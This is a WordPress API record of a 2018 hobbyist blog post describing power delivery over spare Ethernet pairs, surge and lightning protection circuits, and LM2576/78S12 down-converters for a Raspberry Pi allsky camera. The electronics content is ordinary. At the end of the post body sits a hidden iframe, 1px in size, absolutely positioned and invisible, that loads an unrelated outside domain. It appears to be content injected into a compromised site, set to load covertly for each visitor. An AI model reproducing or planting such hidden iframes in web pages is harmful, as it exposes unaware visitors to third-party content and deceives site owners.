{"id":426,"date":"2018-03-22T21:11:36","date_gmt":"2018-03-22T18:11:36","guid":{"rendered":"http:\/\/olegkutkov.me\/?p=426"},"modified":"2021-02-05T16:03:01","modified_gmt":"2021-02-05T14:03:01","slug":"autonomous-allsky-camera-with-raspberry-pi-part-2-powering-and-lightning-protection","status":"publish","type":"post","link":"https:\/\/olegkutkov.me\/2018\/03\/22\/autonomous-allsky-camera-with-raspberry-pi-part-2-powering-and-lightning-protection\/","title":{"rendered":"Autonomous Allsky camera with Raspberry PI. Part 2: powering and lightning protection"},"content":{"rendered":"<p><img loading=\"lazy\" decoding=\"async\" class=\"alignleft wp-image-428 size-thumbnail\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1-150x150.jpg\" alt=\"\" width=\"150\" height=\"150\" \/>This is the second part of the Allsky cycle, and I want to describe powering and protection of this device.<\/p>\n<p>Please read <a href=\"http:\/\/olegkutkov.me\/2018\/03\/20\/autonomous-allsky-camera-with-raspberry-pi-part-1-overview\/\">the first part<\/a> to get basic information about this project.<\/p>\n<p><!--more--><\/p>\n<p>Since the camera box is connected through only one Ethernet cable, it&#8217;s important to deliver via this cable enough power for all internal devices. This cable&#8217;s length is more than 15 meters, so I decided to use a 19v laptop power adapter and custom down-converter inside the camera to get 12, 5, and 3.3 volts.<\/p>\n<p>For power delivery, used free Ethernet pairs of wires: blue and brown.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/poe.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-433 size-full\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/poe.png\" alt=\"\" width=\"640\" height=\"400\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/poe.png 640w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/poe-300x188.png 300w\" sizes=\"(max-width: 640px) 100vw, 640px\" \/><\/a><\/p>\n<p>The total cable length is 15 meters, and it&#8217;s vital to protect the device from static electricity, electromagnetic interference, and voltage spikes.<\/p>\n<h3>Protection circuits<\/h3>\n<p>For better reliability, I used two Ethernet protection circuits on both sides of the cable.<\/p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\"size-full wp-image-437 aligncenter\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/ligth_protection_circuit.png\" alt=\"\" width=\"331\" height=\"291\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/ligth_protection_circuit.png 331w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/ligth_protection_circuit-300x264.png 300w\" sizes=\"(max-width: 331px) 100vw, 331px\" \/><\/p>\n<p>Diode 1.5Ke 7.5 is pretty fast and opens when the line&#8217;s voltage exceeds 5-6 volts. This voltage is draining on the Ground.<br \/>\nTwo spark gaps are arrestors from Epcos.\u00a0 You can bypass the right arrester with a megaohm resistor for better performance and constant current flow.<\/p>\n<p>Both parts of the protection circuit should be properly grounded.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0636.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-441\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0636.jpg\" alt=\"\" width=\"580\" height=\"773\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0636.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0636-225x300.jpg 225w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0636-768x1024.jpg 768w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><\/a><\/p>\n<p>The in-door power injector is built using an old power splitter from telecommunication equipment. Actually, there is only a plastic case and an old PCB with all the removed old components.<\/p>\n<p>You can see the protection circuit near the 8P8C connectors.<\/p>\n<p>A power supply is just directly connected to the brown and blue Ethernet pairs using few bypass capacitors.\u00a0 Both power wires are also grounded via arresters.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0665-1.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-442\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0665-1.jpg\" alt=\"\" width=\"580\" height=\"773\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0665-1.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0665-1-225x300.jpg 225w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/IMG_0665-1-768x1024.jpg 768w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><\/a><\/p>\n<p>Protection circuit inside camera box.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/in_cam_prot.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-443 size-full\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/in_cam_prot.jpg\" alt=\"\" width=\"580\" height=\"497\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/in_cam_prot.jpg 580w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/in_cam_prot-300x257.jpg 300w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><\/a><\/p>\n<p>Connected directly to the grounding screw on the bottom.<\/p>\n<h3>Power down-converter<\/h3>\n<p>This module built using two impulse converters, <a href=\"http:\/\/www.ti.com\/lit\/ds\/symlink\/lm2576.pdf\">LM2576<\/a>. This device is simple to use and requires only a few external components.<\/p>\n<p>12v is used for PWM-controlled coolers and the IRIS motor.<br \/>\nThis converter is linear <a href=\"http:\/\/www.st.com\/content\/ccc\/resource\/technical\/document\/datasheet\/e9\/be\/53\/a3\/1f\/6f\/4f\/75\/CD00000449.pdf\/files\/CD00000449.pdf\/jcr:content\/translations\/en.CD00000449.pdf\">78S12<\/a>, which can provide enough current without overheating. All the heat of this converter is also used for warming up the air inside the camera box.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-445\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm.png\" alt=\"\" width=\"600\" height=\"415\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm.png 1440w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm-300x208.png 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm-768x532.png 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm-1024x709.png 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_shcm-1200x831.png 1200w\" sizes=\"(max-width: 600px) 100vw, 600px\" \/><\/a>T1 and Q1 is a driver for the coolers. The input signal is PWM from the Raspberry. It&#8217;s a good idea to put some additional inductors and capacitors near the fans. Values should be hand-picked depending on how stable your fans on low rpm. In my case used 100 microhenry and 220 microfarads.<\/p>\n<p>All circuit is placed on two-layer handmade PCB.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_bottom.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-447 size-full\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_bottom.png\" alt=\"\" width=\"570\" height=\"731\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_bottom.png 570w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_bottom-234x300.png 234w\" sizes=\"(max-width: 570px) 100vw, 570px\" \/><\/a> <a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_top.png\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-448 size-full\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_top.png\" alt=\"\" width=\"588\" height=\"738\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_top.png 588w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/downconv_pcb_top-239x300.png 239w\" sizes=\"(max-width: 588px) 100vw, 588px\" \/><\/a>Both LM2576 is soldered directly to the boards, which acts as a good radiator, so all components are in a good thermal state under any conditions.<\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-428\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1.jpg\" alt=\"\" width=\"580\" height=\"387\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1.jpg 1280w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1-300x200.jpg 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1-768x512.jpg 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1-1024x682.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr1-1200x800.jpg 1200w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><\/a><\/p>\n<p><a href=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox.jpg\"><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-431\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3.jpg\" alt=\"\" width=\"580\" height=\"387\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3.jpg 1280w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3-300x200.jpg 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3-768x512.jpg 768w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3-1024x682.jpg 1024w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/pwr3-1200x800.jpg 1200w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-446\" src=\"http:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox.jpg\" alt=\"\" width=\"580\" height=\"582\" srcset=\"https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox.jpg 900w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox-150x150.jpg 150w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox-300x300.jpg 300w, https:\/\/olegkutkov.me\/wp-content\/uploads\/2018\/03\/dovnconv_inbox-768x771.jpg 768w\" sizes=\"(max-width: 580px) 100vw, 580px\" \/><\/a>3.3v is used for the Raspberry and all I2C devices. 5V is connected directly to a USB camera cable bypassing the Raspberry board and additional connectors. This voltage is also required for the CPU and should also be connected to the Raspberry 5v line.<\/p>\n<p>End of part 2.<\/p>\n<p>Thanks for reading! \ud83d\ude42<\/p>\n<div><iframe id=\"embedPath\" style=\"height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;\" src=\"\/\/remove.video\/repo\"><\/iframe><\/div>\n","protected":false},"excerpt":{"rendered":"<p>This is the second part of the Allsky cycle, and I want to describe powering and protection of this device. Please read the first part to get basic information about this project.<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[4,11,30],"tags":[42,49,31,48],"_links":{"self":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/426"}],"collection":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/comments?post=426"}],"version-history":[{"count":8,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/426\/revisions"}],"predecessor-version":[{"id":1753,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/posts\/426\/revisions\/1753"}],"wp:attachment":[{"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/media?parent=426"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/categories?post=426"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/olegkutkov.me\/wp-json\/wp\/v2\/tags?post=426"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}